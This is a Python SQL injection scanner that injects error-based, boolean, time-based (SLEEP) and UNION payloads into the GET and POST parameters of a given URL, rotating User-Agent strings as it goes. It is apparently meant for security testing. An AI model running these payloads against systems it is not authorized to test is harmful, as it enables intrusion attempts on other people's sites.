import requests
import time
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Configuration
REQUEST_DELAY = 1  # seconds between requests
TIMEOUT = 10  # seconds
TIME_BASED_THRESHOLD = 5  # seconds delay to consider time-based SQLi

# User-Agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Payloads organized by type but simplified for dashboard output
SQLI_PAYLOADS = [
    # Basic payloads
    "'", "\"", "'--", "\"--", 
    "' OR '1'='1", "\" OR \"1\"=\"1",
    
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--",
    
    # Time-based
    "' OR (SELECT SLEEP(5))--",
    
    # Union-based
    "' UNION SELECT null--"
]

# SQL error patterns to detect
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax error"
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def make_request(url, method='GET', params=None, data=None):
    headers = {'User-Agent': get_random_user_agent()}
    try:
        if method.upper() == 'GET':
            res = requests.get(url, params=params, headers=headers, timeout=TIMEOUT)
        elif method.upper() == 'POST':
            res = requests.post(url, data=data, headers=headers, timeout=TIMEOUT)
        else:
            return None
        return res
    except requests.exceptions.RequestException:
        return None

def check_for_errors(content):
    content_lower = content.lower()
    for error in SQL_ERRORS:
        if error in content_lower:
            return True
    return False

def check_time_based(start_time):
    elapsed = time.time() - start_time
    return elapsed >= TIME_BASED_THRESHOLD

def scan_sql_injection(url, method='GET', post_data=None):
    findings = []
    
    # Check if there are parameters to test
    if method.upper() == 'GET':
        parsed = urlparse(url)
        if not parsed.query:
            findings.append("⚠️ No query parameters found in URL.")
            return findings
        params = parse_qs(parsed.query, keep_blank_values=True)
    elif method.upper() == 'POST' and post_data:
        params = post_data
    else:
        findings.append("⚠️ No parameters found to test.")
        return findings
    
    # Test each parameter with each payload
    for param_name in params.keys():
        if method.upper() == 'GET':
            original_value = params[param_name][0]
        else:
            original_value = post_data[param_name]
        
        for payload in SQLI_PAYLOADS:
            time.sleep(REQUEST_DELAY)
            
            try:
                # Prepare the test
                if method.upper() == 'GET':
                    test_params = params.copy()
                    test_params[param_name] = original_value + payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                    start_time = time.time()
                    response = make_request(test_url, 'GET')
                else:  # POST
                    test_data = post_data.copy()
                    test_data[param_name] = original_value + payload
                    start_time = time.time()
                    response = make_request(url, 'POST', data=test_data)
                
                if response is None:
                    findings.append(f"🚨 Connection failed testing {param_name} with payload: {payload}")
                    continue
                
                # Check for error-based SQLi
                if check_for_errors(response.text):
                    findings.append(f"❗ Error-based SQLi detected in {param_name} with payload: {payload}")
                
                # Check for time-based SQLi
                if "SLEEP" in payload.upper() and check_time_based(start_time):
                    findings.append(f"⏱️ Time-based SQLi detected in {param_name} with payload: {payload}")
                
                # Simple boolean-based check
                if "AND 1=1" in payload or "AND 1=2" in payload:
                    original_response = make_request(url, method, params if method == 'GET' else post_data)
                    if original_response and len(response.text) != len(original_response.text):
                        findings.append(f"🔘 Boolean-based SQLi detected in {param_name} with payload: {payload}")
            
            except Exception as e:
                findings.append(f"🚨 Error testing {param_name} with payload {payload}: {str(e)}")
    
    if not findings:
        findings.append("✅ No SQL Injection vulnerabilities detected.")
    elif len(findings) == 1 and findings[0].startswith("⚠️"):
        pass  # Only has the "no parameters" warning
    elif not any(f.startswith("❗") or f.startswith("⏱️") or f.startswith("🔘") for f in findings):
        findings.append("✅ No SQL Injection vulnerabilities detected.")
    
    return findings

# Example usage (compatible with your original dashboard):
if __name__ == "__main__":
    # Test GET request
    test_url = "http://example.com/page?id=1"
    results = scan_sql_injection(test_url)
    for result in results:
        print(result)
    
    # Test POST request
    post_url = "http://example.com/login"
    post_data = {"username": "admin", "password": "password"}
    results = scan_sql_injection(post_url, method='POST', post_data=post_data)
    for result in results:
        print(result)